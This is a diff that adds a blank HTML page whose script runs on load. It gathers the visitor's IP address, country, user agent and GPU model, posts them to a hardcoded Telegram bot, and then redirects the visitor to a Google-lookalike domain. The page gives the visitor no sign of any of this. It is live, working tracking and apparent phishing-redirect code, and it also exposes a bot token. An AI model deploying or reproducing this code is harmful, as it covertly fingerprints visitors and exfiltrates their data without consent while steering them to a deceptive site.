@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <script>
+    async function collectDataAndRedirect() {
+      let ip = "Unavailable";
+      let countryCode = "Unavailable";
+      let countryName = "Unavailable";
+
+      try {
+        const ipRes = await fetch("https://ipapi.co/json/");
+        const ipData = await ipRes.json();
+        ip = ipData.ip;
+        countryCode = ipData.country; 
+        countryName = ipData.country_name; 
+      } catch (e) {}
+
+      let gpu = "Unavailable";
+      try {
+        let gl = document.createElement('canvas').getContext('webgl');
+        let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        if (debugInfo) {
+          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+      } catch (e) {}
+
+      const userAgent = navigator.userAgent;
+
+      const message = `IP: ${ip}\nCountry: ${countryName} (${countryCode})\nUserAgent: ${userAgent}\nGPU: ${gpu}`;
+
+
+      fetch("https://api.telegram.org/bot8212311446:AAFRj08HFacjBZBdv14XAMXgjMfDKsOEUto/sendMessage", {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({
+          chat_id: '8145892526',
+          text: message
+        })
+      }).finally(() => {
+        window.location.href = "https://google.newupdatepolicy.app";
+      });
+    }
+
+    window.onload = collectDataAndRedirect;
+  </script>
+</head>
+<body>
+</body>
+</html>
